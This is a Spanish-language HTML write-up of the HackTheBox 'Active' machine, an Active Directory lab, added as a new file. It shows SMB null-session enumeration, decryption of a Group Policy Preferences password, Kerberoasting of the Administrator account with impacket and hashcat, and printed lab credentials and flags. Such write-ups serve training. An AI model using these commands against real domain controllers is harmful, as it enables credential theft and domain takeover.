@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #3b82f6;
+    --accent2: #ff6b35;
+    --accent3: #60a5fa;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --green: #2ecc71;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent3);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+    position: relative;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.win      { border-color: var(--accent);  color: var(--accent); }
+  .tag.ad       { border-color: var(--accent3); color: var(--accent3); }
+  .tag.asrep    { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.dcsync   { border-color: var(--red);     color: var(--red); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+  h2 .green   { color: var(--green); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.bash   { border-left-color: var(--green); color: #a8e6c3; }
+  .code-block.sql    { border-left-color: var(--red); color: #ffb3ba; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';           background: var(--accent3);  color: #fff; }
+  .finding.success::before { content: 'PWN';            background: var(--accent);   color: #fff; }
+  .finding.vuln::before    { content: 'VULN';           background: var(--red);      color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA';  background: var(--yellow);   color: #000; }
+  .finding.tip::before     { content: 'TIP';            background: var(--green);    color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open { color: var(--green); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+
+  .db-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    margin: 20px 0;
+  }
+
+  .db-table th {
+    text-align: left;
+    color: var(--red);
+    letter-spacing: 2px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid rgba(255,71,87,0.3);
+    background: rgba(255,71,87,0.04);
+  }
+
+  .db-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .db-table tr:hover td { background: rgba(255,71,87,0.03); }
+  .db-highlight { color: var(--yellow); }
+
+  .flag-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-box.key { border-color: rgba(255,211,42,0.3); background: rgba(255,211,42,0.03); }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-box.key .flag-label { color: var(--yellow); }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(59,130,246,0.08);
+    padding: 1px 6px;
+  }
+
+  .highlight { color: var(--accent2); }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// HackTheBox — Writeup</div>
+    <h1>ACT<span class="glow">IVE</span></h1>
+    <div class="header-meta">
+      <span class="tag win">#windows</span>
+      <span class="tag ad">#active-directory</span>
+      <span class="tag asrep">#gpp-password</span>
+      <span class="tag dcsync">#kerberoasting</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Lo primero es hacer un escaneo con <code>nmap</code> para ver a qué nos enfrentamos.</p>
+
+    <div class="code-label">escaneo de puertos</div>
+    <div class="code-block cmd">nmap -p- -T5 10.129.50.146 -oG allPorts</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="port-num">53/tcp</td><td class="port-open">OPEN</td><td>domain</td></tr>
+        <tr><td class="port-num">88/tcp</td><td class="port-open">OPEN</td><td>kerberos-sec</td></tr>
+        <tr><td class="port-num">135/tcp</td><td class="port-open">OPEN</td><td>msrpc</td></tr>
+        <tr><td class="port-num">139/tcp</td><td class="port-open">OPEN</td><td>netbios-ssn</td></tr>
+        <tr><td class="port-num">389/tcp</td><td class="port-open">OPEN</td><td>ldap</td></tr>
+        <tr><td class="port-num">445/tcp</td><td class="port-open">OPEN</td><td>microsoft-ds</td></tr>
+        <tr><td class="port-num">464/tcp</td><td class="port-open">OPEN</td><td>kpasswd5</td></tr>
+        <tr><td class="port-num">593/tcp</td><td class="port-open">OPEN</td><td>http-rpc-epmap</td></tr>
+        <tr><td class="port-num">636/tcp</td><td class="port-open">OPEN</td><td>ldapssl</td></tr>
+        <tr><td class="port-num">3268/tcp</td><td class="port-open">OPEN</td><td>globalcatLDAP</td></tr>
+        <tr><td class="port-num">3269/tcp</td><td class="port-open">OPEN</td><td>globalcatLDAPssl</td></tr>
+        <tr><td class="port-num">5722/tcp</td><td class="port-open">OPEN</td><td>msdfsr</td></tr>
+        <tr><td class="port-num">9389/tcp</td><td class="port-open">OPEN</td><td>adws</td></tr>
+      </tbody>
+    </table>
+
+    <div class="finding info">
+      <div class="finding-title">Directorio activo</div>
+      Con puertos como el <code>88</code> (Kerberos), <code>389</code> (LDAP) y <code>445</code> (SMB) abiertos, es evidente que la máquina es un controlador de dominio de Active Directory. Un escaneo de scripts revela el dominio <code>active.htb</code>, que se añade al <code>/etc/hosts</code>.
+    </div>
+  </section>
+
+  <!-- FASE 2: NULL SESSION Y GPP -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">NULL SESSION</span> — Credenciales GPP en SYSVOL</h2>
+
+    <p>Se comprueba el listado de shares SMB mediante <code>null session</code>.</p>
+
+    <div class="code-label">enumeración de shares</div>
+    <div class="code-block cmd">nxc smb 10.129.50.146 -u '' -p ''
+nxc smb 10.129.50.146 -u '' -p '' --shares</div>
+
+    <div class="code-block output">Share        Permissions     Remark
+-----        -----------     ------
+ADMIN$                        Remote Admin
+C$                             Default share
+IPC$         READ             Remote IPC
+NETLOGON                      Logon server share
+Replication  READ
+SYSVOL                        Logon server share</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Share Replication accesible anónimamente</div>
+      El share <code>Replication</code> es de lectura pública y contiene una copia de <code>SYSVOL</code>. Dentro de <code>\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\</code> se encuentra el fichero <code>Groups.xml</code>, típico de Group Policy Preferences.
+    </div>
+
+    <div class="code-label">groups.xml</div>
+    <div class="code-block output">&lt;Properties action="U" newName="" fullName="" description=""
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfC
+uNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1"
+acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;</div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Qué es una GPP Password?</div>
+      Las Group Policy Preferences permitían fijar contraseñas de cuentas locales/de servicio cifradas con AES en el atributo <code>cpassword</code> del XML, pero Microsoft publicó la clave AES estática usada para cifrarlas (MS14-025), por lo que cualquier usuario con acceso al <code>SYSVOL</code> puede descifrarlas.
+    </div>
+
+    <p>Se descifra el <code>cpassword</code> con <code>gpp-decrypt</code>.</p>
+
+    <div class="code-label">descifrado de la contraseña gpp</div>
+    <div class="code-block cmd">gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</div>
+
+    <div class="finding success">
+      <div class="finding-title">Credenciales obtenidas</div>
+      Las credenciales del usuario de servicio son <code>SVC_TGS:GPPstillStandingStrong2k18</code>.
+    </div>
+
+    <p>Con estas credenciales se accede al share <code>Users</code> y se recupera la flag del escritorio de <code>SVC_TGS</code>.</p>
+
+    <div class="code-label">acceso al share users</div>
+    <div class="code-block cmd">smbclient //10.129.50.146/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18'</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">USER FLAG</span>
+      <span class="flag-value">4a2aaacd57bc6c38e7c09f08db35d45d</span>
+    </div>
+  </section>
+
+  <!-- FASE 3: KERBEROASTING -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">KERBEROASTING</span> — Ticket TGS del Administrator</h2>
+
+    <p>Con las credenciales de <code>SVC_TGS</code> se lanza un <code>ldapdomaindump</code> para enumerar más información del dominio.</p>
+
+    <div class="code-label">dump del dominio via ldap</div>
+    <div class="code-block cmd">ldapdomaindump active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18'</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">SPN en la cuenta Administrator</div>
+      El usuario <code>Administrator</code> tiene un <code>SPN</code> (Service Principal Name) asociado, lo que lo hace vulnerable a un ataque de <code>Kerberoasting</code>: se puede solicitar su ticket TGS y crackearlo offline sin generar alertas de bloqueo de cuenta.
+    </div>
+
+    <p>Se solicita el ticket con <code>impacket-GetUserSPNs</code> usando las credenciales de <code>SVC_TGS</code>.</p>
+
+    <div class="code-label">solicitud del ticket kerberoast</div>
+    <div class="code-block cmd">impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.50.146 -request-user Administrator -outputfile admin_hash.txt</div>
+
+    <p>Se crackea el hash <code>$krb5tgs$23$...</code> obtenido con <code>hashcat</code> contra <code>rockyou.txt</code>.</p>
+
+    <div class="code-label">crackeo del ticket tgs</div>
+    <div class="code-block cmd">hashcat -m 13100 admin_hash.txt /usr/share/wordlists/rockyou.txt</div>
+
+    <div class="finding success">
+      <div class="finding-title">Contraseña del Administrador crackeada</div>
+      La contraseña del usuario <code>Administrator</code> es <code>Ticketmaster1968</code>.
+    </div>
+  </section>
+
+  <!-- FASE 4: ACCESO COMO ADMINISTRATOR -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="green">ACCESO FINAL</span> — Flag de Administrator</h2>
+
+    <p>Con las credenciales <code>Administrator:Ticketmaster1968</code> se repite el acceso al share <code>Users</code>, esta vez al escritorio del Administrador.</p>
+
+    <div class="code-label">acceso como administrator</div>
+    <div class="code-block cmd">smbclient //10.129.50.146/Users -U 'active.htb/Administrator%Ticketmaster1968'</div>
+
+    <p>La conexión es exitosa y se recupera la flag del escritorio de <code>Administrator</code>.</p>
+
+    <div class="flag-box key">
+      <span class="flag-label">ADMIN FLAG</span>
+      <span class="flag-value">7fbfead7ff667e39046c04da9dea2f38</span>
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">Null session — Share Replication</div>
+          <div class="chain-desc">Acceso anónimo al share <code>Replication</code> (copia de SYSVOL) → <code>Groups.xml</code> con un <code>cpassword</code> de GPP</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">02</div>
+        <div class="chain-content">
+          <div class="chain-title">GPP Password — SVC_TGS</div>
+          <div class="chain-desc">gpp-decrypt descifra el cpassword con la clave AES pública de Microsoft → <code>SVC_TGS:GPPstillStandingStrong2k18</code> → acceso al share Users y <code>user.txt</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Kerberoasting — Administrator</div>
+          <div class="chain-desc">ldapdomaindump revela que Administrator tiene SPN → GetUserSPNs pide su ticket TGS → hashcat lo crackea → <code>Administrator:Ticketmaster1968</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--green); color: var(--green);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--green);">Acceso como Administrator del dominio</div>
+          <div class="chain-desc">smbclient con las credenciales crackeadas → acceso al escritorio del Administrador → <code>root.txt</code></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">ACTIVE // WRITEUP // HACKTHEBOX — CTF</div>
+  </div>
+</footer>
+
+</body>
+</html>
